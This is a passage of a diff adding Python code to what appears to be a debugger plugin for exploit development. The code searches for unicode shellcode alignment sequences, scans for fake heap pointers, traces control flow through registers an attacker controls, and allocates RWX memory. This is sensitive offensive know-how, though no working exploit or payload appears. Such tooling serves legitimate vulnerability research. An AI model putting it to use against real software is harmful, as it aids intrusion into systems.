+						 'add ch,bh': '\\x00\\xfd', 'add cl,al': '\\x00\\xc1', 'add ch,dh': '\\x00\\xf5', 'add cl,ah': '\\x00\\xe1',
+						 'add dh,ch': '\\x00\\xee', 'add ch,dl': '\\x00\\xd5', 'add ch,ah': '\\x00\\xe5', 'mov dh,0': '\\xb6\\x00',
+						 'add dl,ah': '\\x00\\xe2', 'mov dl,0': '\\xb2\\x00', 'mov ch,0': '\\xb5\\x00', 'mov cl,0': '\\xb1\\x00',
+						 'mov bh,0': '\\xb7\\x00', 'add bl,ah': '\\x00\\xe3', 'mov bl,0': '\\xb3\\x00', 'add dh,ah': '\\x00\\xe6',
+						 'add cl,ah': '\\x00\\xe1', 'add bh,ah': '\\x00\\xe7'}
+				for example_instr, example_op in [("mov eax,0x41004300", "\\xb8\\x00\\x43\\x00\\x41"),
+								  ("mov ebx,0x4100af00", "\\xbb\\x00\\xaf\\x00\\x41"),
+								  ("mov ecx,0x41004300", "\\xb9\\x00\\x43\\x00\\x41"),
+								  ("mov edx,0x41004300", "\\xba\\x00\\x43\\x00\\x41")]:
+					for i in range(0,256):
+						padding =""
+						if i < 16:
+							padding = "0"
+						new_instr = example_instr[:14]+padding+hex(i)[2:]+example_instr[16:]
+						new_op = example_op[:10]+padding+hex(i)[2:]+example_op[12:]
+						ass_operation[new_instr] = new_op
+				res = ""
+				for instr in inputInstr.split("; "):
+					if instr in ass_operation:
+						res += ass_operation[instr].replace("\\x00","")
+					elif instr.strip():
+						warn("    Couldn't find metasm assembly for %s" % str(instr))
+						warn("    You have to manually convert it in the metasm shell")
+						res += "<"+instr+">"
+				return res
+				
+			def getCyclic(originals):
+				cyclic = [0 for i in range(0,len(originals))]
+				for index, orig_num in enumerate(originals):
+					cycle = 1
+					num = orig_num
+					while True:
+						cycle += 1
+						num += orig_num
+						num = num % 256
+						if num == orig_num:
+							cyclic[index] = cycle
+							break
+				return cyclic
+
+			def hexlist(lis):
+				return [hex(i) for i in lis]
+				
+			def theX(num):
+				res = (num>>16)<<16 ^ num
+				return res
+				
+			def higher(num):
+				res = num>>8
+				return res
+				
+			def lower(num):
+				res = ((num>>8)<<8) ^ num
+				return res
+				
+			def info(*text):
+				dbg.log(" ".join(str(i) for i in text))
+				
+			def warn(*text):
+				dbg.log(" ".join(str(i) for i in text), highlight=1)
+				
+			def debug(*text):
+				if False:
+					dbg.log(" ".join(str(i) for i in text))
+
+
+			buffer_registers_4_byte_names = [bufferRegister[1]+"h", bufferRegister[1]+"l"]
+			buffer_registers_4_byte_value = theX(registers[bufferRegister])
+			
+			MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS=0.25
+			MAGIC_PROBABILITY_OF_RESETTING=0.04
+			MAGIC_MAX_PROBABILITY_OF_RESETTING=0.11
+
+			originals = []
+			ax = theX(registers["eax"])
+			ah = higher(ax)
+			al = lower(ax)
+				
+			bx = theX(registers["ebx"])
+			bh = higher(bx)
+			bl = lower(bx)
+			
+			cx = theX(registers["ecx"])
+			ch = higher(cx)
+			cl = lower(cx)
+			
+			dx = theX(registers["edx"])
+			dh = higher(dx)
+			dl = lower(dx)
+			
+			start_address = theX(buffer_registers_4_byte_value)
+			s1 = higher(start_address)
+			s2 = lower(start_address)
+			
+			alignment_code_loc_address = theX(alignment_code_loc)
+			g1 = higher(alignment_code_loc_address)
+			g2 = lower(alignment_code_loc_address)
+			
+			names = ['ah', 'al', 'bh', 'bl', 'ch', 'cl', 'dh', 'dl']
+			originals = [ah, al, bh, bl, ch, cl, dh, dl]
+			sanitiseZeros(originals, names)
+			checkDuplicates(originals, names)
+			best_result = checkHigherByteBufferRegisterForOverflow(g1, buffer_registers_4_byte_names[0], g2)
+						
+			xs = [0 for i in range(0,len(originals))]
+			ys = [0 for i in range(0,len(originals))]
+			
+			cyclic = getCyclic(originals)
+			mul = 1
+			for i in cyclic:
+				mul *= i
+
+			if not silent:
+				dbg.log("[+] Searching for random solutions for code alignment code in at least %i possibilities..." % mul)
+				dbg.log("    Bufferregister: %s" % bufferRegister)
+				dbg.log("    Max time: %d seconds" % timeToRun)
+				dbg.log("")
+
+			#We can't even know the value of AH yet (no, it's NOT g1 for high instruction counts)
+			cyclic2 = copy.copy(cyclic)
+			cyclic2[names.index(buffer_registers_4_byte_names[0])] = 9999999
+			
+			number_of_tries = 0.0
+			beginning = time.time()
+			resultFound = False
+			resultcnt = 0
+			while time.time()-beginning < timeToRun: #Run only timeToRun seconds!
+				randomise(xs, cyclic)
+				randomise(ys, cyclic2)
+				
+				#[Extra constraint!]
+				#not allowed: all operations with the bufferRegister,
+				#because we can not rely on it's values, e.g.
+				#add al, al
+				#add al, ah
+				#add ah, ah
+				#add ah, al
+				xs[names.index(buffer_registers_4_byte_names[0])] = 0
+				xs[names.index(buffer_registers_4_byte_names[1])] = 0
+				ys[names.index(buffer_registers_4_byte_names[0])] = 0
+				ys[names.index(buffer_registers_4_byte_names[1])] = 0
+				
+				tmp = check(originals, names.index(buffer_registers_4_byte_names[0]), [s1, s2], [g1, g2], xs, ys, additionalLength, best_result)
+
+				if tmp > 0:
+					best_result = tmp
+					#we got a new result
+					resultFound = True
+					alignresults[resultcnt] = printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength, prefix, postfix)
+					resultcnt += 1
+					if not silent:
+						dbg.log("    Time elapsed so far: %s seconds" % (time.time()-beginning))
+						dbg.log("")
+				#Slightly increases probability of resetting with time
+				probability = MAGIC_PROBABILITY_OF_RESETTING+number_of_tries/(10**8)
+				if probability < MAGIC_MAX_PROBABILITY_OF_RESETTING:
+					number_of_tries += 1.0
+				if random.random() <= probability:
+					xs = [0 for i in range(0,len(originals))]
+					ys = [0 for i in range(0,len(originals))]
+			if not silent:
+				dbg.log("")
+				dbg.log("    Done. Total time elapsed: %s seconds" % (time.time()-beginning))
+			
+
+				if not resultFound:
+					dbg.log("")
+					dbg.log("No results. Please try again (you might want to increase -t)")
+				dbg.log("")
+				dbg.log("If you are unsatisfied with the result, run the command again and use the -t option")
+				dbg.log("")
+			return alignresults
+		# end unicode alignment routines
+
+
+		def procHeapCookie(args):
+			# first find all writeable pages
+			allpages = dbg.getMemoryPages()
+			filename="heapcookie.txt"
+			orderedpages = []
+			cookiemonsters = []
+			for tpage in allpages.keys():
+				orderedpages.append(tpage)
+			orderedpages.sort()
+			for thispage in orderedpages:
+				page = allpages[thispage]
+				page_base = page.getBaseAddress()
+				page_size = page.getSize()
+				page_end = page_base + page_size
+				acl = page.getAccess(human=True)
+				if "WRITE" in acl:
+					processpage = True
+					# don't even bother if page belongs to module that is ASLR/Rebased
+					pageptr = MnPointer(page_base)
+					thismodulename = pageptr.belongsTo()
+					if thismodulename != "":
+						thismod = MnModule(thismodulename)
+						if thismod.isAslr or thismod.isRebase:
+							processpage = False
+					if processpage:
+						dbg.log("[+] Walking page 0x%08x - 0x%08x (%s)" % (page_base,page_end,acl))
+						startptr = page_base  # we need to start here
+						while startptr < page_end-16:
+							# pointer needs to pass 3 tests
+							try:
+								heap_entry = startptr
+								userptr = heap_entry + 0x8
+								cookieptr = heap_entry + 5
+								raw_heapcookie = dbg.readMemory(cookieptr,1)
+								heapcookie = struct.unpack("<B",raw_heapcookie)[0]
+
+								hexptr1 = "%08x" % userptr
+								hexptr2 = "%08x" % heapcookie 
+
+								a1 = hexStrToInt(hexptr1[6:])
+								a2 = hexStrToInt(hexptr2[6:])
+
+								test1 = False
+								test2 = False
+								test3 = False
+
+								if (a1 & 7) == 0:
+									test1 = True
+								if (a2 & 1) == 1:
+									test2 = True
+								if (a2 & 8) == 8:
+									test3 = True
+
+								if test1 and test2 and test3:
+									cookiemonsters.append(startptr+0x8)
+							except:
+								pass
+							startptr += 1
+			dbg.log("")
+			if len(cookiemonsters) > 0:
+				# write to log
+				dbg.log("Found %s (fake) UserPtr pointers." % len(cookiemonsters))
+				all_ptrs = {}
+				all_ptrs[""] = cookiemonsters
+				logfile = MnLog(filename)
+				thislog = logfile.reset()
+				processResults(all_ptrs,logfile,thislog)
+			else:
+				dbg.log("Bad luck, no results.")			
+			return
+
+
+		def procFlags(args):
+			currentflag = getNtGlobalFlag()
+			dbg.log("[+] NtGlobalFlag: 0x%08x" % currentflag)
+			flagvalues = getNtGlobalFlagValues(currentflag)
+			if len(flagvalues) == 0:
+				dbg.log("    No GFlags set")
+			else:
+				for flagvalue in flagvalues:
+					dbg.log("    0x%08x : %s" % (flagvalue,getNtGlobalFlagValueName(flagvalue)))
+			return
+
+
+		def procEval(args):
+			# put all args together
+			argline = ""
+			if len(currentArgs) > 1:
+				if __DEBUGGERAPP__ == "WinDBG":
+					for a in currentArgs[2:]:
+						argline += a
+				else:
+					for a in currentArgs[1:]:
+						argline += a 
+				argline = argline.replace(" ","")
+			if argline.replace(" ","") != "":
+				dbg.log("[+] Evaluating expression '%s'" % argline)
+				val,valok = getAddyArg(argline)
+				if valok:
+					dbg.log("    Result: 0x%08x" % val)
+				else:
+					dbg.log("    *** Unable to evaluate expression ***")
+			else:
+				dbg.log("    *** No expression found***")	
+			return
+
+
+
+		def procDiffHeap(args):
+
+			global ignoremodules
+			filenamebefore = "heapstate_before.db"
+			filenameafter = "heapstate_after.db"
+
+			ignoremodules = True
+
+			statefilebefore = MnLog(filenamebefore)
+			thisstatefilebefore = statefilebefore.reset(clear=False)
+
+			statefileafter = MnLog(filenameafter)
+			thisstatefileafter = statefileafter.reset(clear=False)
+
+			ignoremodules = False
+
+
+			beforestate = {}
+			afterstate = {}
+
+			#do we want to save states, or diff them?
+
+			if not "before" in args and not "after" in args and not "diff" in args:
+				dbg.log("*** Missing mandatory argument -before, -after or -diff ***", highlight=1)
+				return
+
+			if "diff" in args:
+				# check if before and after state file exists
+				if os.path.exists(thisstatefilebefore) and os.path.exists(thisstatefileafter):
+					# read contents from both states into dict
+					dbg.log("[+] Reading 'before' state from %s" % thisstatefilebefore)
+					beforestate = readPickleDict(thisstatefilebefore)
+					dbg.log("[+] Reading 'after' state from %s" % thisstatefileafter)
+					afterstate = readPickleDict(thisstatefileafter)
+					# compare
+					dbg.log("[+] Diffing heap states...")
+
+				else:
+					if not os.path.exists(thisstatefilebefore):
+						dbg.log("[-] Oops, unable to find 'before' state file %s" % thisstatefilebefore)
+					if not os.path.exists(thisstatefileafter):
+						dbg.log("[-] Oops, unable to find 'after' state file %s" % thisstatefileafter)
+				return
+
+			elif "before" in args:
+				thisstatefilebefore = statefilebefore.reset(showheader=False)
+				dbg.log("[+] Enumerating current heap layout, please wait...")
+				currentstate = getCurrentHeapState()
+				dbg.log("[+] Saving current heap layout to 'before' heap state file %s" % thisstatefilebefore)
+				# save dict to file
+				try:
+					writePickleDict(thisstatefilebefore, currentstate)
+					dbg.log("[+] Done")
+				except:
+					dbg.log("[-] Error while saving current state to file")
+				return
+
+			elif "after" in args:
+				thisstatefileafter = statefileafter.reset(showheader=False)
+				dbg.log("[+] Enumerating current heap layout, please wait...")
+				currentstate = getCurrentHeapState()
+				dbg.log("[+] Saving current heap layout to 'after' heap state file %s" % thisstatefileafter)
+				try:
+					writePickleDict(thisstatefileafter, currentstate)
+					dbg.log("[+] Done")
+				except:
+					dbg.log("[-] Error while saving current state to file")				
+				return			
+
+			return
+
+
+		def procFlow(args):
+
+			srplist = []
+			endlist = []
+			cregs = []
+			cregsc = []
+			avoidlist = []
+			endloc = 0
+			rellist = {}
+			funcnamecache = {}
+			branchstarts = {}
+			maxinstr = 60
+			maxcalllevel = 3
+			callskip = 0
+			instrcnt = 0
+			regs = dbg.getRegs()
+			aregs = getAllRegs()
+			addy = regs["EIP"]
+			addyerror = False
+			eaddy = 0
+			showfuncposition = False
+
+			if "cl" in args:
+				if type(args["cl"]).__name__.lower() != "bool":
+					try:
+						maxcalllevel = int(args["cl"])
+					except:
+						pass
+
+			if "cs" in args:
+				if type(args["cs"]).__name__.lower() != "bool":
+					try:
+						callskip = int(args["cs"])
+					except:
+						pass
+			if "avoid" in args:
+				if type(args["avoid"]).__name__.lower() != "bool":
+					try:
+						avoidl = args["avoid"].replace("'","").replace('"',"").replace(" ","").split(",")
+						for aa in avoidl:
+							a,aok = getAddyArg(aa)
+							if aok:
+								if not a in avoidlist:
+									avoidlist.append(a)
+					except:
+						pass		
+
+			if "cr" in args:
+				if type(args["cr"]).__name__.lower() != "bool":
+					crdata = args["cr"]
+					crdata = crdata.replace("'","").replace('"',"").replace(" ","")
+					crlist = crdata.split(",")
+					for c in crlist:
+						c1 = c.upper()
+						if c1 in aregs:
+							cregs.append(c1)
+							csmall = getSmallerRegs(c1)
+							for cs in csmall:
+								cregs.append(cs)
+
+			if "crc" in args:
+				if type(args["crc"]).__name__.lower() != "bool":
+					crdata = args["crc"]
+					crdata = crdata.replace("'","").replace('"',"").replace(" ","")
+					crlist = crdata.split(",")
+					for c in crlist:
+						c1 = c.upper()
+						if c1 in aregs:
+							cregsc.append(c1)
+							csmall = getSmallerRegs(c1)
+							for cs in csmall:
+								cregsc.append(cs)
+
+			cregs = list(set(cregs))
+			cregsc = list(set(cregsc))
+
+			if "n" in args:
+				if type(args["n"]).__name__.lower() != "bool":
+					try:
+						maxinstr = int(args["n"])
+					except:
+						pass	
+
+			if "func" in args:
+				showfuncposition = True
+
+			if "a" in args:
+				if type(args["a"]).__name__.lower() != "bool":
+					addy,addyok = getAddyArg(args["a"])
+					if not addyok:		
+						dbg.log(" ** Please provide a valid start location with argument -a **")
+						return
+
+			if "e" in args:
+				if type(args["e"]).__name__.lower() != "bool":
+					eaddy,eaddyok = getAddyArg(args["e"])
+					if not eaddyok:
+						dbg.log(" ** Please provide a valid end location with argument -e **")
+						return										
+
+
+			dbg.log("[+] Max nr of instructions per branch: %d" % maxinstr)
+			dbg.log("[+] Maximum CALL level: %d" % maxcalllevel)
+			if len(avoidlist) > 0:
+				dbg.log("[+] Only showing flows that don't contains these pointer(s):")
+				for a in avoidlist:
+					dbg.log("    0x%08x" % a)
+			if callskip > 0:
+				dbg.log("[+] Skipping details of the first %d child functions" % callskip)
+			if eaddy > 0:
+				dbg.log("[+] Searching all possible paths between 0x%08x and 0x%08x" % (addy,eaddy))
+			else:
+				dbg.log("[+] Searching all possible paths from 0x%08x" % (addy))
+			if len(cregs) > 0:
+				dbg.log("[+] Controlled registers: %s" % cregs)
+			if len(cregsc) > 0:
+				dbg.log("[+] Controlled register contents: %s" % cregsc)
+
+			# first, get SRPs at this point
+			if addy == regs["EIP"]:
+				cmd2run = "k"
+				srpdata = dbg.nativeCommand(cmd2run)
+				for line in srpdata.split("\n"):
+					linedata = line.split(" ")
+					if len(linedata) > 1:
+						childebp = linedata[0]
+						srp = linedata[1]
+						if isAddress(childebp) and isAddress(srp):
+							srplist.append(hexStrToInt(srp))
+
+			branchstarts[addy] = [0,srplist,0]
+			curlocs = [addy]
+
+			# create relations
+			while len(curlocs) > 0:
+				curloc = curlocs.pop(0)
+				callcnt = 0
+				#dbg.log("New start location: 0x%08x" % curloc)
+				prevloc = curloc
+				instrcnt = branchstarts[curloc][0]
+				srplist = branchstarts[curloc][1]
+				currcalllevel = branchstarts[curloc][2]
+				while instrcnt < maxinstr:
+					beforeloc = prevloc
+					prevloc = curloc
+					try:
+						thisopcode = dbg.disasm(curloc)
+						instruction = getDisasmInstruction(thisopcode)				
+						instructionbytes = thisopcode.getBytes()
+						instructionsize = thisopcode.opsize
+						opupper = instruction.upper()
+						if opupper.startswith("RET"): 
+							if currcalllevel > 0:
+								currcalllevel -= 1
+							if len(srplist) > 0:
+								newloc = srplist.pop(0)
+								rellist[curloc] = [newloc]
+								curloc = newloc
+							else:
+								break
+						elif opupper.startswith("JMP"):
+							if "(" in opupper and ")" in opupper:
+								ipartsa = opupper.split(")")
+								ipartsb = ipartsa[0].split("(")
+								if len(ipartsb) > 0:
+									jmptarget = ipartsb[1]
+									if isAddress(jmptarget):
+										newloc = hexStrToInt(jmptarget)
+										rellist[curloc] = [newloc]
+										curloc = newloc
+						elif opupper.startswith("J"):
+							if "(" in opupper and ")" in opupper:
+								ipartsa = opupper.split(")")
+								ipartsb = ipartsa[0].split("(")
+								if len(ipartsb) > 0:
+									jmptarget = ipartsb[1]
+									if isAddress(jmptarget):
+										newloc = hexStrToInt(jmptarget)
+										if not newloc in curlocs:
+											curlocs.append(newloc)
+										branchstarts[newloc] = [instrcnt,srplist,currcalllevel]
+										newloc2 = prevloc + instructionsize
+										rellist[curloc] = [newloc,newloc2]
+										curloc = newloc2
+										#dbg.log("    Added 0x%08x as alternative branch start" % newloc)
+						elif opupper.startswith("CALL"):
+							
+							if ("(" in opupper and ")" in opupper) and currcalllevel < maxcalllevel and callcnt > callskip:
+								ipartsa = opupper.split(")")
+								ipartsb = ipartsa[0].split("(")
+								if len(ipartsb) > 0:
+									jmptarget = ipartsb[1]
+									if isAddress(jmptarget):
+										newloc = hexStrToInt(jmptarget)
+										rellist[curloc] = [newloc]
+										curloc = newloc
+								newretptr = prevloc + instructionsize
+								srplist.insert(0,newretptr)
+								currcalllevel += 1
+							else:
+								# don't show the function details, simply continue after the call
+								newloc = curloc+instructionsize
+								rellist[curloc] = [newloc]
+								curloc = newloc
+							callcnt += 1
+						else:
+							curloc += instructionsize
+							rellist[prevloc] = [curloc]
+					except:
+						#dbg.log("Unable to disasm at 0x%08x, past: 0x%08x" % (curloc,beforeloc))
+						if not beforeloc in endlist:
+							endlist.append(beforeloc)
+						instrcnt = maxinstr
+						break
+					#dbg.log("%d 0x%08x : %s  -> 0x%08x" % (instrcnt,prevloc,instruction,curloc))
+					instrcnt += 1
+				if not curloc in endlist:
+					endlist.append(curloc)
+
+			dbg.log("[+] Found total of %d possible flows" % len(endlist))
+
+			if eaddy > 0:
+				if eaddy in rellist:
+					endlist = [eaddy]
+					dbg.log("[+] Limit flows to cases that contain 0x%08x" % eaddy)
+				else:
+					dbg.log(" ** Unable to reach 0x%08x ** " % eaddy)
+					dbg.log("    Try increasing max nr of instructions with parameter -n")
+					return
+
+			filename = "flows.txt"
+			logfile = MnLog(filename)
+			thislog = logfile.reset()
+
+			dbg.log("[+] Processing %d endings" % len(endlist))
+			endingcnt = 1
+			processedresults = []
+			for endaddy in endlist:
+				dbg.log("[+] Creating all paths between 0x%08x and 0x%08x" % (addy,endaddy))
+				allpaths = findAllPaths(rellist,addy,endaddy)
+				if len(allpaths) == 0:
+					#dbg.log("    *** No paths from 0x%08x to 0x%08x *** " % (addy,endaddy))
+					continue
+
+				dbg.log("[+] Ending: 0x%08x (%d/%d), %d paths" % (endaddy,endingcnt,len(endlist), len(allpaths)))
+				endingcnt += 1
+
+				for p in allpaths:
+					if p in processedresults:
+						dbg.log("    > Skipping duplicate path from 0x%08x to 0x%08x" % (addy,endaddy))
+					else:
+						processedresults.append(p)
+						skipthislist = False
+						logl = "Path from 0x%08x to 0x%08x (%d instructions) :" % (addy,endaddy,len(p))
+						if len(avoidlist) > 0:
+							for a in avoidlist:
+								if a in p:
+									dbg.log("    > Skipping path, contains 0x%08x (which should be avoided)"%a)
+									skipthislist = True
+									break
+						if not skipthislist:
+							logfile.write("\n",thislog)
+							logfile.write(logl,thislog)
+							logfile.write("-" * len(logl),thislog)
+							dbg.log("    > Simulating path from 0x%08x to 0x%08x (%d instructions)" % (addy,endaddy,len(p)))
+							cregsb = []
+							for c in cregs:
+								cregsb.append(c)
+							cregscb = []
+							for c in cregsc:
+								cregscb.append(c)
+
+							prevfname = ""
+							fname = ""
+							foffset = ""
+							previnstruction = ""
+							for thisaddy in p:
+								if showfuncposition:
+									if previnstruction == "" or previnstruction.startswith("RET") or previnstruction.startswith("J") or previnstruction.startswith("CALL"):
+										if not thisaddy in funcnamecache:
+											fname,foffset = getFunctionName(thisaddy)
+											funcnamecache[thisaddy] = [fname,foffset]
+										else:
+											fname = funcnamecache[thisaddy][0]
+											foffset = funcnamecache[thisaddy][1]
+										if fname != prevfname:
+											prevfname = fname
+											locname = fname
+											if foffset != "":
+												locname += "+%s" % foffset
+											logfile.write("#--- %s ---" % locname,thislog)
+										#dbg.log("%s" % locname)
+
+								thisopcode = dbg.disasm(thisaddy)
+								instruction = getDisasmInstruction(thisopcode)
+								previnstruction = instruction
+								clist = []
+								clistc = []
+								for c in cregsb:
+									combins = []
+									combins.append(" %s" % c)
+									combins.append("[%s" % c)
+									combins.append(",%s" % c)
+									combins.append("%s]" % c)
+									combins.append("%s-" % c)
+									combins.append("%s+" % c)
+									combins.append("-%s" % c)
+									combins.append("+%s" % c)
+									for comb in combins:
+										if comb in instruction and not c in clist:
+											clist.append(c)
+
+								for c in cregscb:
+									combins = []
+									combins.append(" %s" % c)
+									combins.append("[%s" % c)
+									combins.append(",%s" % c)
+									combins.append("%s]" % c)
+									combins.append("%s-" % c)
+									combins.append("%s+" % c)
+									combins.append("-%s" % c)
+									combins.append("+%s" % c)
+									for comb in combins:
+										if comb in instruction and not c in clistc:
+											clistc.append(c)
+								
+								rsrc,rdst = getSourceDest(instruction)
+
+								csource = False
+								cdest = False
+
+								if rsrc in cregsb or rsrc in cregscb:
+									csource = True
+								if rdst in cregsb or rdst in cregscb:
+									cdest = True
+
+								destructregs = ["MOV","XOR","OR"]
+								writeregs = ["INC","DEC","AND"]
+
+
+								ocregsb = copy.copy(cregsb)
+
+								if not instruction.startswith("TEST") and not instruction.startswith("CMP"):
+									for d in destructregs:
+										if instruction.startswith(d):
+											sourcefound = False
+											sourcereg = ""
+											destfound = False
+											destreg = ""
+
+											for s in clist:
+												for sr in rsrc:
+													if s in sr and not sourcefound:
+														sourcefound = True
+														sourcereg = s
+												for sr in rdst:
+													if s in sr and not destfound:
+														destfound = True
+														destreg = s
+
+											if sourcefound and destfound:
+												if not destreg in cregsb:
+													cregsb.append(destreg)
+											if destfound and not sourcefound:
+												sregs = getSmallerRegs(destreg)
+												if destreg in cregsb:
+													cregsb.remove(destreg)
+												for s in sregs:
+													if s in cregsb:
+														cregsb.remove(s)
+											break
+								#else:
+									#dbg.log("    Control: %s" % ocregsb)
+
+
+								logfile.write("0x%08x : %s" % (thisaddy,instruction),thislog)
+								
+								#if len(cregs) > 0 or len(cregsb) > 0:
+								#	if cmp(ocregsb,cregsb) == -1:
+								#		dbg.log("    Before: %s" % ocregsb)
+								#		dbg.log("    After : %s" % cregsb)
+			return
+
+
+		def procChangeACL(args):
+			size = 1
+			addy = 0
+			acl = ""
+			addyerror = False
+			aclerror = False
+			if "a" in args:
+				if type(args["a"]).__name__.lower() != "bool":
+					addy,addyok = getAddyArg(args["a"])
+					if not addyok:
+						addyerror = True
+			if "acl" in args:
+				if type(args["acl"]).__name__.lower() != "bool":
+					if args["acl"].upper() in memProtConstants:
+						acl = args["acl"].upper()
+					else:
+						aclerror = True
+			else:
+				aclerror = True	
+			
+			if addyerror:
+				dbg.log(" *** Please specify a valid address to argument -a ***")
+
+			if aclerror:
+				dbg.log(" *** Please specify a valid memory protection constant with -acl ***")
+				dbg.log(" *** Valid values are :")
+				for acltype in memProtConstants:
+					dbg.log("     %s (%s = 0x%02x)" % (toSize(acltype,10),memProtConstants[acltype][0],memProtConstants[acltype][1]))
+
+			if not addyerror and not aclerror:
+				pageacl = memProtConstants[acl][1]
+				pageaclname = memProtConstants[acl][0]
+				dbg.log("[+] Current ACL: %s" % getPointerAccess(addy))
+				dbg.log("[+] Desired ACL: %s (0x%02x)" % (pageaclname,pageacl))
+				retval = dbg.rVirtualAlloc(addy,1,0x1000,pageacl)
+			return
+
+
+		def procToBp(args):
+			"""
+			Generate WinDBG syntax to create a logging breakpoint on a given location
+			"""
+			addy = 0
+			addyerror = False
+			executenow = False
+			locsyntax = ""
+			regsyntax = ""
+			poisyntax = ""
+			dmpsyntax = ""
+			instructionparts = []
+			global silent
+			oldsilent = silent
+			regs = dbg.getRegs()
+			silent = True
+			if "a" in args:
+				if type(args["a"]).__name__.lower() != "bool":
+					addy,addyok = getAddyArg(args["a"])
+					if not addyok:
+						addyerror = True
+			else:
+				addy = regs["EIP"]
+
+			if "e" in args:
+				executenow = True
+
+			if addyerror:
+				dbg.log(" *** Please provide a valid address with argument -a ***",highlight=1)
+				return
+
+			# get RVA for addy (or absolute address if addy is not part of a module)
+			bpdest = "0x%08x" % addy
+			instruction = ""
+			ptrx = MnPointer(addy)
+			modname = ptrx.belongsTo()
+			if not modname == "":
+				mod = MnModule(modname)
+				m = mod.moduleBase
+				rva = addy - m
+				bpdest = "%s+0x%02x" % (modname,rva)
+				thisopcode = dbg.disasm(addy)
+				instruction = getDisasmInstruction(thisopcode)
+
+			locsyntax = "bp %s" % bpdest
+
+			instructionparts = multiSplit(instruction,[" ",","])
+
+			usedregs = []
+			
+			for reg in regs:
+				for ipart in instructionparts:
+					if reg.upper() in ipart.upper():
+						usedregs.append(reg)
+
+			if len(usedregs) > 0:
+				regsyntax = '.printf \\"'
+				argsyntax = ""
+				
+				for ipart in instructionparts:
+					for reg in regs:
+						if reg.upper() in ipart.upper():
+
+							if "[" in ipart:
+								regsyntax += ipart.replace("[","").replace("]","")
+								regsyntax += ": 0x%08x, "
+
+								argsyntax += "%s," % ipart.replace("[","").replace("]","")
+
+								regsyntax += ipart
+								regsyntax += ": 0x%08x, "								
+
+								argsyntax += "%s," % ipart.replace("[","poi(").replace("]",")")
+								
+								iparttxt = ipart.replace("[","").replace("]","")
+								dmpsyntax += ".echo;.echo %s:;dds %s L 0x24/4;" % (iparttxt,iparttxt)
+							else:
+								regsyntax += ipart
+								regsyntax += ": 0x%08x, "								
+								argsyntax += "%s," % ipart 
+				argsyntax = argsyntax.strip(",")
+				regsyntax = regsyntax.strip(", ")
+				regsyntax += '\\",%s;' % argsyntax
+
+			if "CALL" in instruction.upper():
+				dmpsyntax += '.echo;.printf \\"Stack (esp: 0x%08x):\\",esp;.echo;dds esp L 0x4;'
+
+			if instruction.upper().startswith("RET"):
+				dmpsyntax += '.echo;.printf \\"EAX: 0x%08x, Ret To: 0x%08x, Arg1: 0x%08x, Arg2: 0x%08x, Arg3: 0x%08x, Arg4: 0x%08x\\",eax,poi(esp),poi(esp+4),poi(esp+8),poi(esp+c),poi(esp+10);'
+
+			bpsyntax = locsyntax + ' ".echo ---------------;u eip L 1;' + regsyntax + dmpsyntax + ".echo;g" + '"'
+			filename = "logbps.txt"
+			logfile = MnLog(filename)
+			thislog = logfile.reset(False,False)
+			with open(thislog, "a") as fh:
+				fh.write(bpsyntax + "\n")
+			silent = oldsilent
+			dbg.log("%s" % bpsyntax)
+			dbg.log("Updated %s" % thislog)
+			if executenow:
+				dbg.nativeCommand(bpsyntax)
+				dbg.log("> Breakpoint set at 0x%08x" % addy)
+			return
+
+
+		def procAllocMem(args):
+			size = 0x1000
+			addy = 0
+			sizeerror = False
+			addyerror = False
+			byteerror = False
+			fillup = False
+			writemore = False
+			fillbyte = "A"
+			acl = "RWX"
+
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					sval = args["s"]
+					if sval.lower().startswith("0x"):
+						try:
+							size = int(sval,16)
+						except:
+							sizeerror = True
+					else:
+						try:
+							size = int(sval)
+						except:
+							sizeerror = True
+				else:
+					sizeerror = True
+
+			if "b" in args:
+				if type(args["b"]).__name__.lower() != "bool":
+					try:
+						fillbyte = hex2bin(args["b"])[0]
+					except:
+						dbg.log(" *** Invalid byte specified with -b ***")
+						byteerror = True
+
+			if size < 0x1:
+				sizeerror = True
+				dbg.log(" *** Minimum size is 0x1 bytes ***",highlight=1)
+
+			if "a" in args:
+				if type(args["a"]).__name__.lower() != "bool":
+					addy,addyok = getAddyArg(args["a"])
+					if not addyok:
+						addyerror = True
+
+			if "fill" in args:
+				fillup = True
+				if "force" in args:
+					writemore = True
+
+			aclerror = False
+			if "acl" in args:
+				if type(args["acl"]).__name__.lower() != "bool":
+					if args["acl"].upper() in memProtConstants:
+						acl = args["acl"].upper()
+					else:
+						aclerror = True
+						dbg.log(" *** Please specify a valid memory protection constant with -acl ***")
+						dbg.log(" *** Valid values are :")
+						for acltype in memProtConstants:
+							dbg.log("     %s (%s = 0x%02x)" % (toSize(acltype,10),memProtConstants[acltype][0],memProtConstants[acltype][1]))
+
+			if addyerror:
+				dbg.log(" *** Please specify a valid address with -a ***",highlight=1)
+
+			if sizeerror:
+				dbg.log(" *** Please specify a valid size with -s ***",highlight = 1)
+			
+			if not addyerror and not sizeerror and not byteerror and not aclerror:
+				dbg.log("[+] Requested allocation size: 0x%08x (%d) bytes" % (size,size))
+				if addy > 0:
+					dbg.log("[+] Desired target location : 0x%08x" % addy)
+				pageacl = memProtConstants[acl][1]
+				pageaclname = memProtConstants[acl][0]
+				if addy > 0:
+					dbg.log("    Current page ACL: %s" % getPointerAccess(addy))
+				dbg.log("    Desired page ACL: %s (0x%02x)" % (pageaclname,pageacl))
+				VIRTUAL_MEM = ( 0x1000 | 0x2000 )
+				allocat = dbg.rVirtualAlloc(addy,size,0x1000,pageacl)
+				if addy == 0 and allocat > 0:
+					retval = dbg.rVirtualProtect(allocat,1,pageacl)
+				else:
+					retval = dbg.rVirtualProtect(addy,1,pageacl)
+				
+				dbg.log("[+] Allocated memory at 0x%08x" % allocat)
+				#if allocat > 0:
+				#	dbg.log("    ACL 0x%08x: %s" % (allocat,getPointerAccess(allocat)))
+				#else:
+				#	dbg.log("    ACL 0x%08x: %s" % (addy,getPointerAccess(addy)))
+
+				if allocat == 0 and fillup and not writemore:
+					dbg.log("[+] It looks like the page was already mapped. Use the -force argument")
+					dbg.log("    to make me write to 0x%08x anyway" % addy)
+				if (allocat > 0 and fillup) or (writemore and fillup):
+					loc = 0
+					written = 0
+					towrite = size
+					while loc < towrite:
+						try:
+							dbg.writeMemory(addy+loc,fillbyte)
+							written += 1
+						except:
+							pass
+						loc += 1
